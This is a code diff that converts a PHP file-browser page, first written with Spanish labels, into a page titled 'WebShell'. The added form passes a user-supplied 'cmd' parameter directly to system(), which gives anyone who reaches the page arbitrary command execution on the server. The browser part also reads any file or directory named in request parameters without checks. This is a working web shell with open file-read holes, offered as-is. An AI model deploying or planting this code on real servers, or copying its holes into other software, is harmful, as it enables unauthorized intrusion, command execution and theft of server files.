@@ -2,19 +2,17 @@
 $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
 $files = scandir($dir);
 
-// Función para mostrar el contenido de un archivo
-function mostrarContenido($archivo) {
-    if (is_file($archivo)) {
-        return file_get_contents($archivo);
+function showContent($file) {
+    if (is_file($file)) {
+        return file_get_contents($file);
     } else {
         return "No se pudo abrir el archivo.";
     }
 }
 
-// Verificar si se ha hecho clic en un archivo
 if (isset($_GET['file'])) {
-    $archivo = $_GET['file'];
-    $contenido = mostrarContenido($archivo);
+    $file = $_GET['file'];
+    $contenido = showContent($file);
 }
 ?>
 
@@ -23,7 +21,7 @@ if (isset($_GET['file'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Navegador de Archivos</title>
+    <title>WebShell</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -33,7 +31,7 @@ body {
 }
 
 .container {
-    max-width: 800px;
+    max-width: 900px;
     margin: 20px auto;
     background-color: #fff;
     padding: 20px;
@@ -79,7 +77,19 @@ h1 {
 </head>
 <body>
   <div class="container">
-        <h1>Navegador de Archivos</h1>
+    <h1>Webshell</h1>
+    <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+      <label>Command:</label>
+      <input type="text" name="cmd" autofocus id="cmd" size="80">
+      <button type="submit">Execute</button>
+    </form>
+    <pre>
+    <?php
+      if(isset($_GET['cmd'])){
+        system($_GET['cmd']);
+      }
+    ?>
+    </pre>
         <div class="breadcrumb">
             <?php
             $breadcrumbs = explode('/', $dir);
@@ -94,21 +104,22 @@ h1 {
         </div>
         <?php if (isset($contenido)): ?>
             <div class="file-content">
-                <h2>Contenido de <?php echo basename($archivo); ?></h2>
+                <h2>Contenido de <?php echo basename($file); ?></h2>
+                <p><a href="?dir=<?php echo urlencode(dirname($file)); ?>">Back</a></p>
                 <pre style="overflow:auto;"><?php echo htmlspecialchars($contenido); ?></pre>
-                <p><a href="?dir=<?php echo urlencode(dirname($archivo)); ?>">Volver al listado del directorio</a></p>
+                <p><a href="?dir=<?php echo urlencode(dirname($file)); ?>">Back</a></p>
             </div>
         <?php else: ?>
             <div class="file-browser">
                 <table width="100%">
                     <tr>
-                        <th style="width: 50%;">Nombre</th>
-                        <th style="width: 50%;">Tipo</th>
+                        <th style="width: 50%;">Name</th>
+                        <th style="width: 50%;">Type</th>
                     </tr>
                     <?php if ($dir != '.'): ?>
                         <tr>
-                            <td><a href="?dir=<?php echo dirname($dir); ?>">Directorio Anterior</a></td>
-                            <td>Directorio</td>
+                            <td><a href="?dir=<?php echo dirname($dir); ?>">../</a></td>
+                            <td>Directory</td>
                         </tr>
                     <?php endif; ?>
                     <?php foreach ($files as $file): ?>
@@ -121,8 +132,8 @@ h1 {
                                         <a href="?file=<?php echo $dir . '/' . $file; ?>"><?php echo $file; ?></a>
                                     <?php endif; ?>
                                 </td>
-                                <td>
-                                    <?php echo is_dir($dir . '/' . $file) ? 'Directorio' : 'Archivo'; ?>
+                                <td style="text-align:center">
+                                    <?php echo is_dir($dir . '/' . $file) ? 'Directory' : 'File'; ?>
                                 </td>
                             </tr>
                         <?php endif; ?>
